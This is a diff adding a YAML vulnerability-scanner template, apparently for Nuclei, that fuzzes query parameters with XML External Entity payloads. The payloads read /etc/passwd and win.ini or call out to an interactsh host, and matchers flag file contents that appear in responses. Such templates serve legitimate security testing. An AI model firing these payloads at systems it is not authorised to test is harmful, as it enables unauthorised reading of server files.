@@ -1,0 +1,59 @@
+id: generic-xxe
+
+info:
+  name: Generic XML External Entity - (XXE)
+  author: pwnhxl,AmirHossein Raeisi
+  severity: medium
+  reference:
+    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  metadata:
+    max-request: 2
+  tags: dast,xxe
+
+variables:
+  rletter: "{{rand_base(6,'abc')}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      xxe:
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>'
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>'
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>'
+
+    fuzzing:
+      - part: query
+        keys-regex:
+          - "(.*?)xml(.*?)"
+        fuzz:
+          - "{{xxe}}"
+
+      - part: query
+        values:
+          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
+        fuzz:
+          - "{{xxe}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 4b0a00483046022100f4bbfc3971586034fe4acec998d83906a5475082576c1188c48196e212dd6147022100acbeef0ac9677e9e0e5665a5181eb75b9d52bd56103b81a525ba9b9c307e566c:922c64590222798bb761d5b6d8e72950
